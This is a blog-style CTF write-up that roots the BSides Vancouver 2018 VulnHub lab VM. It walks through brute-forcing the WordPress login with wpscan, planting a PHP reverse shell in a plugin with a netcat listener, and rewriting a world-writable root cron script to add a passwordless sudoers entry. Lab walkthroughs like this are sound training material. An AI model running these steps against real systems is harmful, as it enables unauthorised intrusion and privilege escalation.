---
title: "CTF Write Up : BSides Vancouver 2018 Workshop"
description: "BSides Vancouver 2018 CTF Challenge from vulnhub.com"
layout: post
categories: CTF
---
Back again with another CTF write up. This boot2root VM was meant for a workshop style 
introduction to penetration testing techniques, methodologies, common pitfalls and 
tools at a conference in Vancouver. The VulnHub.com page can be found [here](https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/) and the 
slides from the talk can be found [here](https://www.abatchy.com/projects).

### Information Gathering

nmap service version scan output: 
{% highlight terminal %}
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.5
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
{% endhighlight %}

Browsing to `ftp://target.ipaddress` reveals a `public` directory with a text file 
backup called `users.txt.bk` containing usernames:

{% highlight text %}
abatchy
john
mai
anne
doomguy
{% endhighlight %}

I've saved this list in a textfile called `b-side-users.txt` in my home directory

Here's the robots.txt from the webpage:
{% highlight text %}
User-agent: *
Disallow: /backup_wordpress
{% endhighlight %}

A hidden wordpress installation. There's our entry point. 

### Bruteforcing the WordPress login form with wpscan

According to a page from the blog, `john` is site admin. So we can use the username john with the 
`rockyou` wordlist to bruteforce the login form with `wpscan`. 

{% highlight terminal %}
wpscan --url 192.168.56.101/backup_wordpress/ --wordlist /usr/share/wordlists/rockyou.txt --username john
{% endhighlight %}

This will run for a while with an endless ETA due to the rockyou wordlist being huge. 

Strangely, wpscan threw out the following "error":
{% highlight terminal %}
  [!] ERROR: We received an unknown response for login: john and password: enigma
{% endhighlight %}

Even if it's an error, giving the credentials a try grants access to the 
`wp-admin` directory. 

### Getting a shell on the machine

After using those credentials to login, setting up a PHP reverse shell by pasting 
the contents of [this PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) into one of the plugins source code with the editor. 
I edited the "Hello Dolly" plugin, kept the plugin details like `Plugin Name:` and `Plugin URI:` as is 
(because without that information WordPress doesn't run the code), then pasted the 
pentestmonkey reverse shell source code. 

There are two variables to change: `$ip = '127.0.0.1';` should be changed to 
our Kali VM's IP and just because `$port = 1234` will be changed to `$port = 666;`

### Hail Satan, we're in

All that's left to do with WordPress, is enable the plugin _after_ setting up the 
netcat listener. 

Listening for the connection with netcat: 
{% highlight terminal %}

root@kali:~# nc -l -p 666
Linux bsides2018 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
 11:13:41 up  7:51,  0 users,  load average: 0.00, 0.05, 1.38
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 

{% endhighlight %}

Spawning an interactive tty shell:
{% highlight terminal %}
python -c 'import pty; pty.spawn("bin/bash")'
www-data@bsides:/$ 
{% endhighlight %}

### Unpriviledged access 
Time to look into escalating www-data privileges or logging into another users account.
### Plaintext passwords in the WordPress installation?
Here's a snippet from the `wp-config.php` file: 
{% highlight php %}
// MySQL database username
define('DB_USER', 'john@localhost');

// MySQL database password
define('DB_PASSWORD', 'thiscannotbeit');
{% endhighlight %}

These could be the credentials for the user john on this machine and not just 
MySQL creds. Let's give it a shot: 
{% highlight terminal %}
www-data@bsides2018:/var/www/backup_wordpress$ su john
su john
Password: thiscannotbeit

su: Authentication failure
www-data@bsides2018:/var/www/backup_wordpress$
{% endhighlight %}
Ah.. what a shame. 
### Are there misconfigured cronjobs?
is there a script file that's world writeable being executed by the root user? 
{% highlight terminal %}
www-data@bsides2018:/etc$ cat crontab
cat crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /usr/local/bin/cleanup
#
www-data@bsides2018:/etc$ 
{% endhighlight %}

The `/usr/local/bin/cleanup` script looks promising. 
Checking the file permissions: 

{% highlight terminal %}
www-data@bsides2018:/etc$ ls -asl /usr/local/bin/cleanup
ls -asl /usr/local/bin/cleanup
4 -rwxrwxrwx 1 root root 64 Mar  3  2018 /usr/local/bin/cleanup
{% endhighlight %}

It's world writeable and runs as root. The cleanup script before the changes:

{% highlight bash %}
#!/bin/bash

# Clean those damn logs!
rm -rf /var/log/apache2/*
{% endhighlight %}

### Adding www-data to the sudoers file

if you're a brave soul and wish to use `vi` over the netcat session be my guest. 
I'll just rewrite the script to add the www-data user to the sudoers file with echo:
{% highlight terminal %}
www-data@bsides2018:/usr/local/bin$ echo 'echo -e "#!/bin/sh\nwww-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' >> cleanup
www-data@bsides2018:/usr/local/bin$ cat cleanup
cat cleanup
#!/bin/sh
echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
www-data@bsides2018:/usr/local/bin$ 
{% endhighlight %}

At this point, I went to make a coffee. Sometimes it takes a while. 

### Getting root
{% highlight terminal %}
www-data@bsides2018:/etc$ sudo -i
sudo -i
root@bsides2018:~#
{% endhighlight %}
### Capturing the flag
`flag.txt` is in the root directory:

>Congratulations!
>
>If you can read this, that means you were able to obtain root permissions on this VM.
>You should be proud!
>
>There are multiple ways to gain access remotely, as well as for privilege escalation.
>Did you find them all?
>
>@abatchy17

Revisiting the VM at a later date and figuring out some of the other methods of remote access 
and privilege escalation sounds like a fun idea. 

### Until then, Happy Hacking!
